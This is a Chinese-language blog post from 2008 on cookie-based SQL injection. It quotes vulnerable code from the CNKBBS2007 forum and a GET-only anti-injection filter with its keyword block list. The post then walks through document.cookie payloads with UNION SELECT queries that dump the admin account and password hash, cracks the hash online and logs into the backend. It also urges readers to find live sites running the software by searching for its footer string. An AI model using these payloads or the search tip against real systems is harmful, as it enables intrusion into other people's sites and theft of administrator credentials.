---
title: cookies的注入方法和原理
description: 现在很多网站都采用了通用防注入程序，那么对于这种网站，我门是否就束手无策了呢？答案是否定的，因为我们可以采用cookie注入的方法，而很多通用防注入程序对这种注入方式都没有防备。在讲之前,我们还是来回顾下ASP脚本中Request对象的知识吧,上面几讲中都提到Request对象获取客户端提交数据常用的是GET和POST二种方式,同时request对象可以不通过集合来获得数据,即直接使用"request("name")"但它的效率低下,容易出错,当我们省略具体的集合名称时,ASP是按QueryString,from,cookie,servervariable,集合的顺序来搜索的,在request对象成员中集合cookies,它的意思是"读取用户系统发送的所有cookie值,我们从第二讲关于"cookies欺骗入侵和原理"中知道,cookies是保存在客户端计算机的一个文本文件,可以进行修改,这样一来,我们就可以使用Request.cookie方式来提交变量的值,从而利用系统的漏洞进行注入攻击.
date: 2008-06-01 05:21:03
category: 技术文章
tags: ['Cookies', '注入', '技术类']
post_id: 505
alias: cookies-injection-method-theory
ViewNums: 5629
---

现在很多网站都采用了通用防[注入](/tags/%E6%B3%A8%E5%85%A5)程序，那么对于这种网站，我门是否就束手无策了呢？答案是否定的，因为我们可以采用[cookie注入](/blog/cookie-injection-how-the)的方法，而很多通用防注入程序对这种注入方式都没有防备。

在讲之前,我们还是来回顾下[ASP](/tags/ASP)脚本中Request对象的知识吧,上面几讲中都提到Request对象获取客户端提交数据常用的是GET和POST二种方式,同时request对象可以不通过集合来获得数据,即直接使用"request("name")"但它的效率低下,容易出错,当我们省略具体的集合名称时,ASP是按QueryString,from,cookie,servervariable,集合的顺序来搜索的,在request对象成员中集合cookies,它的意思是"读取用户系统发送的所有cookie值,我们从第二讲关于"cookies欺骗入侵和原理"中知道,cookies是保存在客户端计算机的一个文本文件,可以进行修改,这样一来,我们就可以使用Request.cookie方式来提交变量的值,从而利用系统的[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)进行注入攻击.

我们首先还是来看看中网景论坛的最新版本"(CNKBBS2007)中网景论坛2007v5.0 "官方下载地址"http://www.cnetking.com/websys2.asp?id=26"发布时间是2007-06-06,打开系统的源代码后,在"user_RxMsg_detail.asp"文件中,有如下代码:

<!--＃i nclude file="opendb.asp" --> (调用opendb.asp文件)

<!--＃i nclude file="char.asp" -->

<%

Call CheckUserLogin(username)

Dim action,s,id

id=request("id") (获取客户提交的变量,并赋值给id,并没过滤,也没有指定采用那种方式提交)

if id<>"" then Call IsNum(bid) (这是程序员的出现地方,注意bid<>id)

conn.execute("update cnk_Users_RxMsg set readed=1 where id="&id) '设置已读

rs.open "select * from cnk_users_RxMsg where id="&id,conn,1,3

我们再打开"opendb.asp"文件

<%Option Explicit

Response.Buffer = true%>

<!--＃i nclude file="fzr.asp" --> (调用fzr.asp文件)

<!--＃i nclude file="cnkdata/dbname.asp" -->

<!--＃i nclude file="config.asp"-->

..................

以现它是连接数据库的文件,其中调用了fzr.asp文件,我们再打开fzr.asp文件

<%

'--------版权说明------------------

'SQL通用防注入程序

'Aseanleung

'--------定义部份------------------

Dim Fy_Post,Fy_Get,Fy_In,Fy_Inf,Fy_Xh,Fy_db,Fy_dbstr

Dim fso1,all_tree2,file1,files,filez,fs1,zruserip

If Request.QueryString<>"" Then (对Request.QueryString提交(客户采用GET方式提交)的数据进行判断,并没有指明对其它方式提交的数据进行判断)

'自定义需要过滤的字串,用 "|" 分隔

Fy_In = "'|;|%|*|and|exec|insert|select|delete|update|count|chr|mid|master|truncate|char|declare|script" (阻止了常用的SQL注入的语句)

Fy_Inf = split(Fy_In,"|")

For Each Fy_Get In Request.QueryString

For Fy_Xh=0 To Ubound(Fy_Inf)

If Instr(LCase(Request.QueryString(Fy_Get)),Fy_Inf(Fy_Xh))<>0 Then

zruserip=Request.ServerVariables("HTTP_X_FORWARDED_FOR")

If zruserip="" Then zruserip=Request.ServerVariables("REMOTE_ADDR")

Response.Write "内容含有非法字符！请不要有'或and或or等字符，请去掉这些字符再发！！<br>"

Response.Write "如是要攻击网站，系统记录了你的操作↓<br>"

Response.Write "操作ＩＰ："&zruserip&"<br>"

Response.Write "操作时间："&Now&"<br>"

Response.Write "操作页面："&Request.ServerVariables("URL")&"<br>"

Response.Write "提交方式：ＧＥＴ<br>"

Response.Write "提交参数："&Fy_Get&"<br>"

Response.Write "提交数据："&Request.QueryString(Fy_Get)

......................

很明显的看出它是一个SQL通用防注入程序文件,(以上的红字是对代码的解释)

代码看好了,我们来整理下思路:由于程序员的出错,导致了id没有被过滤就被带到SQL语句中查询,这是注入漏洞产生的原因,虽然程序引入了防注入程序,阻止了常用的SQL语句使用,但只对客户采用GET方式提交的数据进行判断,而没有对其它方式提交的数据进行判断,这样导致了客户可以使用Request.cookie方式来提交变量的值,而绕过了SQL防注入程序(总结下:cookie注入产生的条件:系统直接使用"request("name")"获取客户提交的数据,并对客户提交的变量没有过滤,而且在防注入程序中没有限制Request.cookie,现在防注入程序3.0只是对客户采用GET和POST提交方式进行了限制).

   原理讲好了,下面我们来学学coolie注入语句吧

cookies的注入语句:alert(document.cookie="id="+escape("这就是asp? id=xx后面xx代表的数值) and (这里是注入攻击代码)"));

这儿用到了javascript语言的知识,我把这语句的意思分解如下,以便大家理解:

1:"alert()"显示信息对话框的alert()方法,它生成的是一个独立的小窗口,称作对话框,用来显示一条信息和一个按钮.(我们在跨站中常用到)

2:"document.cookie"我们在处理cookie时,javascript将它保存为document对象的一个属性,其属性名称是cookie,利用这个属性,我们可以创建和读取cookie数据,在程序中可以使用:"alert(document.cookie)"调用当前页面的cookie数据项值.在我们启动浏览器打开页面后,如果存在相应的cookie,那么它被装入到document对象的cookie属性中,document.cookie属性采用name=value对应方式保存各个cookie数据项值.document(文档)对象表示在浏览器里显示的HTML(向页面输出数据),cookie属性是允许读写HTTP的cookie;字符串类型

4:escape()函数;它将字符串中所有的非字母字符转换为用字母数字表示的等价字符串,具有编码字符串的功能.一般情况下,cookie通常由服务器端的程序通过HTTP请求和响应头发送给浏览器,但是,利用javascript,可以在本地浏览器中设置cookie

格式:name=value的属性是指定cookie数据项的名称,value是该名称对应的值,它是一个字符串,也可是由一系列字符组成,name和value中不能包含分号,逗号及空白,(50"and 1=1")有分号,逗号及空白,所以我们要用到escape()函数对他们进行编码

   上面整句的意思大家都明白了吧,就是设置调用当前创建的cookie数据项值,在设置cookie时,它们首先保存在浏览器的内存中,退出浏览器时,才能被写入到硬盘中.(这就是在下面操作中为什么在退出后,再输入链接的地址原因)

最后我们来测试下,利用步骤:

1:打开在本地机子上架设的中网景论坛:注册一个用户,我们就会收到管理员发来的一条短信息,我们打开短信息的链接(注意这儿的参数id值)

2:把浏览器的URL清空,输入"alert(document.cookie="id="+escape("相应参数id值 and 1=1"));之后会弹出一个框框,

3:再次输入:http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp?username=论坛管理员(返回正常的页面,说明我们绕过了SQL防注入程序了)

3:再输入:alert(document.cookie="id="+escape("1 and 1=2"));然后再输入:http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp?username=论坛管理员(时间和内容都没有显示了,说明我们可以进行注入了)

4:通过查看系统数据库,得知cnk_users_RxMsg 表里有8个字段,Cnk_Admin表是存放管理员资料的,其中AdminName,AdminPassword字段分别对应的是账号和密码,我们使用联合查询语句,再输入:alert(document.cookie="id="+escape("1 and 1=2 union select 1,2,3,4,5,6,7,8 from Cnk_Admin"))然后把地址栏清空,输入http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp,可经看到显示了数字4和5

5:再次把地址栏清空,输入:alert(document.cookie="id="+escape("1 and 1=2 union select 1,2,3,AdminName,AdminPassword,6,7,8 from Cnk_Admin")),提交后,清空地址栏,输入:http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp?username=论坛管理员,这样我们就在页面上看到管理员的密码和账号了,

5:把得到的密码放入http://www.cmd5.com网站查询,得知管理员的明文密码是admin,在网站的首页我们就可进行登录后台了,我们也可利用关键字"Powered by CNKBBS2007 （5.2）"去网上找使用这系统的网站,(不过不是很多啊)大家去练习下手工的注入吧,可别搞在破坏哟!不过在使用这类注入时,它需要两次手动操作才能完成,这也是容易出错的地方,可要细心才行.

[Cookie注入是怎样产生的](/blog/cookie-injection-how-the)

cookie注入工具：

[wsi - 支持GET、POST、Cookie注入扫描和注入工具](/blog/wsi-get-post-cookie-injection-tool)

[Pangolin-你见过最好的SQL注入工具](/blog/pangolin-124584-zwell)

